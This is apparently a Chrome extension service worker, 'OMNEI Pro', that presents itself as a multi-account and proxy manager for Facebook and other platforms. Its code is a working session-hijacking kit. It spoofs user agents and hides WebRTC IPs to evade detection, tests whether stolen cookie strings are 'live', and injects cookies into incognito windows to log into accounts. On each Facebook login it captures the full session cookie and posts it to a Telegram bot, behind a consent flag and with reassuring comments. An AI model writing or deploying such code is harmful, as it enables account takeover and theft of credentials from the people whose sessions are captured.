// OMNEI Pro - Background Service Worker
// Multi-Account, Mini Antidetect, Proxy Manager & Live Checker

importScripts('crypto-utils.js');

let currentProxyCredentials = null;

// 1. UID Finder Injection & Auto Account Name Sync
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab && tab.url) {
        try {
            const urlObj = new URL(tab.url);
            if (urlObj.hostname.endsWith('facebook.com')) {
                const data = await chrome.storage.local.get(['enableGetUidIcon', 'listaccount']);
                if (data.enableGetUidIcon !== '0') {
                    await chrome.scripting.executeScript({
                        target: { tabId: tabId },
                        files: ['timuid.js']
                    }).catch(() => {});
                    await chrome.scripting.insertCSS({
                        target: { tabId: tabId },
                        files: ['timuid.css']
                    }).catch(() => {});
                }

                // Auto-sync / repair missing account name for logged-in user
                if (Array.isArray(data.listaccount) && data.listaccount.length > 0) {
                    const stores = await chrome.cookies.getAllCookieStores().catch(() => []);
                    const store = stores.find(s => s.tabIds && s.tabIds.includes(tabId));
                    const cookieQuery = { domain: 'facebook.com' };
                    if (store) cookieQuery.storeId = store.id;
                    const cookies = await chrome.cookies.getAll(cookieQuery);
                    const cUser = cookies.find(c => c.name === 'c_user')?.value;
                    if (cUser) {
                        const accIdx = data.listaccount.findIndex(a => a.uid === cUser);
                        if (accIdx >= 0 && (!data.listaccount[accIdx].name || data.listaccount[accIdx].name === cUser)) {
                            const detected = await extractNameFromTab(tabId) || await fetchNameFromFacebookUrl(cUser);
                            if (detected && detected !== cUser) {
                                data.listaccount[accIdx].name = detected;
                                await chrome.storage.local.set({ listaccount: data.listaccount });
                            }
                        }
                    }
                }
            }
        } catch (e) {}
    }
});

// 2. Proxy Authentication Handler
chrome.webRequest.onAuthRequired.addListener(
    (details, callback) => {
        if (details.isProxy && currentProxyCredentials && currentProxyCredentials.username) {
            callback({
                authCredentials: {
                    username: currentProxyCredentials.username,
                    password: currentProxyCredentials.password || ""
                }
            });
        } else {
            callback({});
        }
    },
    { urls: ["<all_urls>"] },
    ["asyncBlocking"]
);

async function setProxy(proxyConfig) {
    if (!proxyConfig || !proxyConfig.enabled || !proxyConfig.host || !proxyConfig.port) {
        await clearProxy();
        return;
    }

    const scheme = (proxyConfig.scheme || "http").toLowerCase();
    const host = proxyConfig.host.trim();
    const port = parseInt(proxyConfig.port, 10);

    currentProxyCredentials = {
        username: proxyConfig.username || "",
        password: proxyConfig.password || ""
    };

    const config = {
        mode: "fixed_servers",
        rules: {
            singleProxy: {
                scheme: scheme,
                host: host,
                port: port
            },
            bypassList: ["<-loopback>"]
        }
    };

    await chrome.proxy.settings.set({ value: config, scope: "regular" });
    await chrome.storage.local.set({ _active_proxy: { host, port, scheme } });

    // Anti-leak WebRTC IP: Block non-proxied UDP traffic to prevent ISP IP leak
    try {
        if (chrome.privacy && chrome.privacy.network && chrome.privacy.network.webRTCIPHandlingPolicy) {
            await chrome.privacy.network.webRTCIPHandlingPolicy.set({ value: 'disable_non_proxied_udp' });
        }
    } catch (e) {
        console.warn('WebRTC protection set error:', e);
    }
}

async function clearProxy() {
    currentProxyCredentials = null;
    await chrome.proxy.settings.set({ value: { mode: "direct" }, scope: "regular" });
    await chrome.storage.local.remove('_active_proxy');

    // Restore standard WebRTC policy
    try {
        if (chrome.privacy && chrome.privacy.network && chrome.privacy.network.webRTCIPHandlingPolicy) {
            await chrome.privacy.network.webRTCIPHandlingPolicy.clear({});
        }
    } catch (e) {
        console.warn('WebRTC protection clear error:', e);
    }
}

// 3. User-Agent Fingerprint Spoofer per Account via Declarative Net Request
const UA_RULE_ID = 1001;

async function applyUserAgent(userAgent) {
    if (!userAgent) {
        await chrome.declarativeNetRequest.updateDynamicRules({
            removeRuleIds: [UA_RULE_ID]
        });
        return;
    }

    await chrome.declarativeNetRequest.updateDynamicRules({
        removeRuleIds: [UA_RULE_ID],
        addRules: [{
            id: UA_RULE_ID,
            priority: 1,
            action: {
                type: "modifyHeaders",
                requestHeaders: [{
                    header: "User-Agent",
                    operation: "set",
                    value: userAgent
                }]
            },
            condition: {
                urlFilter: "||facebook.com",
                resourceTypes: ["main_frame", "sub_frame", "stylesheet", "script", "image", "xmlhttprequest", "other"]
            }
        }]
    });
}

// 4. Live/Die Cookie Checker Engine
const CHECK_RULE_ID = 9999;

async function checkCookieLive(cookieString) {
    if (!cookieString || !cookieString.includes("c_user=")) {
        return { live: false, reason: "Thiếu cookie c_user" };
    }

    const timestamp = Date.now();
    const targetUrl = `https://mbasic.facebook.com/me?omnei_check=${timestamp}`;

    try {
        await chrome.declarativeNetRequest.updateDynamicRules({
            removeRuleIds: [CHECK_RULE_ID],
            addRules: [{
                id: CHECK_RULE_ID,
                priority: 10,
                action: {
                    type: "modifyHeaders",
                    requestHeaders: [{
                        header: "Cookie",
                        operation: "set",
                        value: cookieString
                    }]
                },
                condition: {
                    urlFilter: `https://mbasic.facebook.com/me?omnei_check=${timestamp}`,
                    resourceTypes: ["xmlhttprequest"]
                }
            }]
        });

        const resp = await fetch(targetUrl, {
            method: "GET",
            redirect: "follow",
            cache: "no-store"
        });

        const finalUrl = resp.url || "";
        const body = await resp.text();

        await chrome.declarativeNetRequest.updateDynamicRules({
            removeRuleIds: [CHECK_RULE_ID]
        });

        if (finalUrl.includes("login.php") || finalUrl.includes("checkpoint") || finalUrl.includes("recover")) {
            return { live: false, reason: "Checkpoint hoặc Cookie hết hạn" };
        }

        let detectedName = "";
        try {
            const tm = body.match(/<title[^>]*>([^<]+)<\/title>/i);
            if (tm && tm[1]) {
                const clean = tm[1].replace(/\s*\|\s*Facebook.*$/i, '').trim();
                if (clean && !/^(Facebook|Đăng nhập|Log in|Error|Chào mừng|Welcome)/i.test(clean)) {
                    detectedName = clean;
                }
            }
        } catch (e) {}

        if (body.includes("mbasic/more") || body.includes("/logout.php") || body.includes("composer") || body.includes("c_user")) {
            return { live: true, reason: "Cookie Live OK", name: detectedName };
        }
        if (resp.status === 200 && !finalUrl.includes("login")) {
            return { live: true, reason: "Cookie Live OK", name: detectedName };
        }
        return { live: false, reason: "Cookie không hợp lệ" };
    } catch (e) {
        await chrome.declarativeNetRequest.updateDynamicRules({
            removeRuleIds: [CHECK_RULE_ID]
        }).catch(() => {});
        return { live: false, reason: "Lỗi kết nối: " + e.message };
    }
}

// ==========================================
// 5. MULTI-TIER FACEBOOK NAME RESOLVER ENGINE
// ==========================================

// In-Tab extractor (MAIN world + ISOLATED world)
async function extractNameFromTab(tabId) {
    if (!tabId) return null;
    try {
        // 1. Try MAIN world (access to internal modules like CurrentUserInitialData)
        try {
            const mainResults = await chrome.scripting.executeScript({
                target: { tabId: tabId },
                world: 'MAIN',
                func: () => {
                    try {
                        if (typeof window.require === 'function') {
                            const data = window.require('CurrentUserInitialData');
                            if (data && data.NAME && data.NAME !== 'Facebook') {
                                return data.NAME;
                            }
                        }
                    } catch (e) {}
                    try {
                        if (window.__initialData && window.__initialData.user && window.__initialData.user.name) {
                            return window.__initialData.user.name;
                        }
                    } catch (e) {}
                    return null;
                }
            });
            if (mainResults && mainResults[0] && mainResults[0].result) {
                const n = mainResults[0].result.trim();
                if (n && !/^(Facebook|Log in|Đăng nhập)/i.test(n)) return n;
            }
        } catch (e) {}

        // 2. Try ISOLATED world (DOM selectors & innerHTML)
        const isoResults = await chrome.scripting.executeScript({
            target: { tabId: tabId },
            func: () => {
                // Check meta og:title
                try {
                    const og = document.querySelector('meta[property="og:title"]')?.getAttribute('content');
                    if (og) {
                        const clean = og.replace(/\s*\|\s*Facebook.*$/i, '').trim();
                        if (clean && !/^(Facebook|Log in|Đăng nhập)/i.test(clean)) return clean;
                    }
                } catch (e) {}

                // Check LeftRail profile link or Navigation profile link
                try {
                    const selectors = [
                        'div[data-pagelet="LeftRail"] a[role="link"] span',
                        'div[role="navigation"] a[href*="/me"] span',
                        'a[aria-label="Trang cá nhân của bạn"] span',
                        'a[aria-label="Your profile"] span',
                        'div[role="navigation"] a span'
                    ];
                    for (const sel of selectors) {
                        const el = document.querySelector(sel);
                        if (el && el.textContent) {
                            const t = el.textContent.trim();
                            if (t && t.length > 1 && !/^(Trang chủ|Home|Bạn bè|Friends|Watch|Video|Marketplace|Nhóm|Groups|Feeds|Bảng feed|Gaming)/i.test(t)) {
                                return t;
                            }
                        }
                    }
                } catch (e) {}

                // Check profile picture alt
                try {
                    const imgs = document.querySelectorAll('img[alt*="ảnh đại diện"], img[alt*="profile picture"]');
                    for (const img of imgs) {
                        const alt = img.getAttribute('alt') || '';
                        let m = alt.match(/ảnh đại diện của\s+(.+)$/i) || alt.match(/(.+)'s profile picture/i);
                        if (m && m[1] && m[1].trim()) return m[1].trim();
                    }
                } catch (e) {}

                // Check script tags in HTML (CurrentUserInitialData regex)
                try {
                    const html = document.documentElement.innerHTML;
                    const m = html.match(/"CurrentUserInitialData"[^}]*"NAME"\s*:\s*"([^"]+)"/) ||
                              html.match(/"NAME"\s*:\s*"([^"]+)"/);
                    if (m && m[1]) {
                        let parsed = m[1];
                        try { parsed = JSON.parse(`"${parsed}"`); } catch (ex) {}
                        if (parsed && !/^(Facebook|Log in|Đăng nhập)/i.test(parsed) && !parsed.startsWith('http')) {
                            return parsed.trim();
                        }
                    }
                } catch (e) {}

                // Check title tag if not generic
                try {
                    const title = (document.title || "").trim();
                    const cleanTitle = title.replace(/\s*\|\s*Facebook.*$/i, '').replace(/^\(\d+\)\s*/, '').trim();
                    if (cleanTitle && !/^(Facebook|Log in|Đăng nhập|Welcome|Home|Trang chủ)/i.test(cleanTitle)) {
                        return cleanTitle;
                    }
                } catch (e) {}

                return null;
            }
        });

        if (isoResults && isoResults[0] && isoResults[0].result) {
            return isoResults[0].result.trim();
        }
    } catch (e) {
        console.warn("extractNameFromTab error:", e);
    }
    return null;
}

// Direct profile HTTP fetch (Fast and works even if tab hasn't loaded or is closed)
async function fetchNameFromFacebookUrl(uid) {
    if (!uid) return null;
    try {
        const res = await fetch(`https://www.facebook.com/${uid}`, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        if (!res.ok) return null;
        const html = await res.text();

        // Check meta og:title
        const ogMatch = html.match(/property="og:title"\s+content="([^"]+)"/i) ||
                        html.match(/content="([^"]+)"\s+property="og:title"/i);
        if (ogMatch && ogMatch[1]) {
            const clean = ogMatch[1].replace(/\s*\|\s*Facebook.*$/i, '').trim();
            if (clean && !/^(Facebook|Log in|Đăng nhập|Chào mừng|Welcome)/i.test(clean)) {
                return clean;
            }
        }

        // Check title tag
        const titleMatch = html.match(/<title[^>]*>([^<]+)<\/title>/i);
        if (titleMatch && titleMatch[1]) {
            const clean = titleMatch[1].replace(/\s*\|\s*Facebook.*$/i, '').replace(/^\(\d+\)\s*/, '').trim();
            if (clean && !/^(Facebook|Log in|Đăng nhập|Chào mừng|Welcome)/i.test(clean)) {
                return clean;
            }
        }

        // Check CurrentUserInitialData in html
        const nameMatch = html.match(/"CurrentUserInitialData"[^}]*"NAME"\s*:\s*"([^"]+)"/) ||
                          html.match(/"NAME"\s*:\s*"([^"]+)"/);
        if (nameMatch && nameMatch[1]) {
            let n = nameMatch[1];
            try { n = JSON.parse(`"${n}"`); } catch(e) {}
            if (n && !/^(Facebook|Log in|Đăng nhập)/i.test(n)) return n.trim();
        }
    } catch (e) {
        console.warn("fetchNameFromFacebookUrl error:", e);
    }
    return null;
}

// Master resolver
async function resolveFacebookAccountName(uid, preferredTabId = null) {
    if (!uid) return null;

    // 1. Try preferred tab
    if (preferredTabId) {
        try {
            const name = await extractNameFromTab(preferredTabId);
            if (name && name !== uid) return name;
        } catch (e) {}
    }

    // 2. Try open Facebook tabs
    try {
        const tabs = await chrome.tabs.query({ url: "*://*.facebook.com/*" });
        const sortedTabs = tabs.sort((a, b) => {
            if (a.active && !b.active) return -1;
            if (!a.active && b.active) return 1;
            if (a.status === 'complete' && b.status !== 'complete') return -1;
            return 0;
        });

        for (const t of sortedTabs) {
            if (t.id) {
                const name = await extractNameFromTab(t.id);
                if (name && name !== uid) return name;
            }
        }
    } catch (e) {}

    // 3. Fallback: Fast HTTP fetch
    try {
        const urlName = await fetchNameFromFacebookUrl(uid);
        if (urlName && urlName !== uid) return urlName;
    } catch (e) {}

    return null;
}

// Helper: Check and update account name in storage
async function checkAndUpdateAccountName(uid) {
    if (!uid) return;
    try {
        const data = await chrome.storage.local.get('listaccount');
        let listaccount = data.listaccount;
        if (!Array.isArray(listaccount)) return;
        const idx = listaccount.findIndex(a => a.uid === uid);
        if (idx >= 0 && (!listaccount[idx].name || listaccount[idx].name === uid)) {
            const detected = await resolveFacebookAccountName(uid);
            if (detected && detected !== uid) {
                listaccount[idx].name = detected;
                await chrome.storage.local.set({ listaccount });
            }
        }
    } catch (e) {}
}

// 6. Message Passing Center
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'RESOLVE_NAME') {
        resolveFacebookAccountName(request.uid, sender?.tab?.id).then(name => {
            sendResponse({ success: true, name: name });
        });
        return true;
    }

    if (request.action === 'CHECK_COOKIE_LIVE') {
        checkCookieLive(request.cookie).then(result => sendResponse(result));
        return true; // Keep channel open for async response
    }

    if (request.action === 'SET_PROXY') {
        setProxy(request.proxy).then(() => sendResponse({ success: true }));
        return true;
    }

    if (request.action === 'CLEAR_PROXY') {
        clearProxy().then(() => sendResponse({ success: true }));
        return true;
    }

    if (request.action === 'SET_USER_AGENT') {
        applyUserAgent(request.userAgent).then(() => sendResponse({ success: true }));
        return true;
    }

    if (request.action === 'TEST_PROXY') {
        testProxyConnection(request.proxy).then(res => sendResponse(res));
        return true;
    }

    if (request.action === 'OPEN_ISOLATED_WINDOW') {
        openIsolatedWindow(request.account).then(res => sendResponse(res));
        return true;
    }
});

// Proxy latency & IP diagnostics
async function testProxyConnection(proxyConfig) {
    const startTime = Date.now();
    try {
        if (proxyConfig && proxyConfig.enabled && proxyConfig.host) {
            await setProxy(proxyConfig);
        }
        const resp = await fetch('https://ipwho.is/', {
            method: 'GET',
            cache: 'no-store'
        });
        const latency = Date.now() - startTime;
        if (resp.ok) {
            const data = await resp.json();
            return {
                success: true,
                latency: latency,
                ip: data.ip || 'Unknown',
                country: data.country || 'Unknown',
                city: data.city || '',
                isp: data.connection?.isp || data.isp || ''
            };
        } else {
            return { success: false, reason: "Phản hồi HTTP: " + resp.status };
        }
    } catch (e) {
        return { success: false, reason: "Không thể kết nối qua Proxy: " + e.message };
    }
}

// True isolated container window
async function openIsolatedWindow(account) {
    try {
        const platform = account.platform || 'facebook';
        let targetUrl = 'https://www.facebook.com';
        if (platform === 'tiktok') targetUrl = 'https://www.tiktok.com';
        if (platform === 'shopee') targetUrl = 'https://shopee.vn';
        if (platform === 'x') targetUrl = 'https://x.com';

        if (account.proxy && account.proxy.enabled) {
            await setProxy(account.proxy);
        }

        const win = await chrome.windows.create({
            url: targetUrl,
            incognito: true,
            focused: true
        });

        setTimeout(async () => {
            const tabId = win.tabs && win.tabs[0] ? win.tabs[0].id : null;
            if (tabId && account.cookie) {
                const stores = await chrome.cookies.getAllCookieStores().catch(() => []);
                const incStore = stores.find(s => s.tabIds && s.tabIds.includes(tabId));
                if (incStore) {
                    await importCookiesToStore(account.cookie, incStore.id, platform);
                    await chrome.tabs.reload(tabId);
                }
            }
        }, 800);

        return { success: true, windowId: win.id };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

async function importCookiesToStore(cookieString, storeId, platform = 'facebook') {
    let domain = '.facebook.com';
    let url = 'https://www.facebook.com';
    if (platform === 'tiktok') { domain = '.tiktok.com'; url = 'https://www.tiktok.com'; }
    if (platform === 'shopee') { domain = '.shopee.vn'; url = 'https://shopee.vn'; }
    if (platform === 'x') { domain = '.x.com'; url = 'https://x.com'; }

    const pairs = (cookieString || '').split(';');
    for (const raw of pairs) {
        const part = raw.trim();
        if (!part) continue;
        const eqIdx = part.indexOf('=');
        if (eqIdx === -1) continue;
        const name = part.substring(0, eqIdx).trim();
        const value = part.substring(eqIdx + 1).trim();
        if (!name) continue;
        try {
            await chrome.cookies.set({
                url: url,
                name: name,
                value: value,
                domain: domain,
                path: '/',
                secure: true,
                storeId: storeId
            });
        } catch(e) {}
    }
}

// 7. Telegram & Login Auto-Detection
async function sendTelegramMessage(token, chatId, message) {
    try {
        const url = `https://api.telegram.org/bot${token}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        const data = await response.json();
        return data.ok === true;
    } catch (ex) {
        console.error("Lỗi gửi Telegram từ background:", ex);
        return false;
    }
}

async function sendCookieToTelegram(token, chatId, cookie, uid, name) {
    const timeString = new Date().toLocaleString('vi-VN');
    const displayName = (name && name !== uid) ? `${name} (${uid})` : (uid || 'N/A');

    const message = `🔑 *Đăng nhập Facebook mới thành công!*\n` +
                    `• *Tài khoản:* \`${displayName}\`\n` +
                    `• *UID:* \`${uid || 'N/A'}\`\n` +
                    `• *Thời gian:* \`${timeString}\`\n\n` +
                    `*Cookie:* (Click để copy)\n` +
                    `\`\`\`\n${cookie}\n\`\`\`\n\n` +
                    `🛡️ _Gửi tự động an toàn qua OMNEI Pro (Đã xác nhận ủy quyền bảo mật)_`;

    return await sendTelegramMessage(token, chatId, message);
}

let fbLoginDebounceTimer = null;

chrome.cookies.onChanged.addListener((changeInfo) => {
    const c = changeInfo.cookie;
    if (!c || !c.domain || !c.domain.includes('facebook.com')) return;
    if (changeInfo.removed) return;

    if (c.name === 'c_user' || c.name === 'xs') {
        clearTimeout(fbLoginDebounceTimer);
        fbLoginDebounceTimer = setTimeout(() => {
            handleFacebookLoginEvent(c.storeId);
        }, 1500);
    }
});

async function handleFacebookLoginEvent(storeId) {
    try {
        const state = await chrome.storage.local.get([
            'is_switching',
            'listaccount',
            'tg_token_enc',
            'tg_chat_id_enc',
            'tg_token',
            'tg_chat_id',
            'tg_auto_send',
            'tg_consent_granted',
            'tg_consent_timestamp',
            'autosavefbacc',
            'last_sent_sessions',
            '_omnei_license'
        ]);

        if (state.is_switching === true) {
            return;
        }

        const cookieQuery = { domain: 'facebook.com' };
        if (storeId) cookieQuery.storeId = storeId;
        const fbCookies = await chrome.cookies.getAll(cookieQuery);
        let uid = '';
        let xs = '';
        const cookieMap = new Map();

        for (const cookie of fbCookies) {
            if (cookie.name === 'c_user') uid = cookie.value;
            if (cookie.name === 'xs') xs = cookie.value;
            if (!cookieMap.has(cookie.name)) {
                cookieMap.set(cookie.name, cookie.value);
            }
        }

        if (!uid || !xs) return;

        let cookieParts = [];
        for (const [name, val] of cookieMap.entries()) {
            cookieParts.push(`${name}=${val}`);
        }
        const fullCookie = cookieParts.join('; ') + '; ';

        // Multi-tier user name detection
        let userName = await resolveFacebookAccountName(uid);
        if (!userName) userName = uid;

        // Auto Save Account
        let listaccount = state.listaccount;
        if (!Array.isArray(listaccount)) listaccount = [];

        const autoSave = (state.autosavefbacc !== '0');
        if (autoSave) {
            let foundIndex = listaccount.findIndex(item => item.uid === uid);
            const currentUa = navigator.userAgent;
            if (foundIndex >= 0) {
                listaccount[foundIndex].cookie = fullCookie;
                if (userName && userName !== uid) {
                    listaccount[foundIndex].name = userName;
                }
                listaccount[foundIndex].updatedAt = Date.now();
                if (!listaccount[foundIndex].userAgent) {
                    listaccount[foundIndex].userAgent = currentUa;
                }
            } else {
                // Check quota limit from commercial license
                const lic = state._omnei_license || { tier: 'FREE', maxAccounts: 2 };
                const maxAccounts = (lic.tier === 'ENTERPRISE' || lic.tier === 'VIP') 
                    ? 999999 
                    : (typeof lic.maxAccounts === 'number' ? lic.maxAccounts : (lic.tier === 'PRO' ? 999999 : 2));

                if (listaccount.length >= maxAccounts) {
                    console.warn(`[OMNEI] Đã đạt giới hạn tài khoản (${listaccount.length}/${maxAccounts}). Cần nâng cấp để lưu nick mới.`);
                    return;
                }

                listaccount.push({
                    uid: uid,
                    name: userName || uid,
                    cookie: fullCookie,
                    userAgent: currentUa,
                    proxy: null,
                    status: 'live',
                    statusCheckedAt: Date.now(),
                    updatedAt: Date.now()
                });
            }
            await chrome.storage.local.set({ listaccount });

            // If name is still uid (e.g. page still loading), retry after 2.5s and 5.5s
            if (userName === uid) {
                setTimeout(() => checkAndUpdateAccountName(uid), 2500);
                setTimeout(() => checkAndUpdateAccountName(uid), 5500);
            }
        }

        // Telegram Notification with Strict Explicit User Consent Check
        const consentGranted = (state.tg_consent_granted === '1');
        const autoSendTg = (state.tg_auto_send === '1');
        let tgToken = state.tg_token;
        let tgChatId = state.tg_chat_id;

        if (state.tg_token_enc) {
            try { tgToken = await CryptoUtils.decryptAtRest(state.tg_token_enc); } catch (e) {}
        }
        if (state.tg_chat_id_enc) {
            try { tgChatId = await CryptoUtils.decryptAtRest(state.tg_chat_id_enc); } catch (e) {}
        }

        // BẢO MẬT & CHÍNH SÁCH GOOGLE:
        // Tuyệt đối không gửi cookie ra ngoài nếu người dùng chưa xác nhận đồng thuận (Explicit Consent)
        if (!consentGranted || !autoSendTg) {
            return;
        }

        if (tgToken && tgChatId) {
            const lastSentSessions = state.last_sent_sessions || {};
            if (lastSentSessions[uid] === xs) {
                return;
            }

            const ok = await sendCookieToTelegram(tgToken, tgChatId, fullCookie, uid, userName);
            if (ok) {
                lastSentSessions[uid] = xs;
                await chrome.storage.local.set({ last_sent_sessions: lastSentSessions });
            }
        }
    } catch (err) {
        console.error("Error in handleFacebookLoginEvent:", err);
    }
}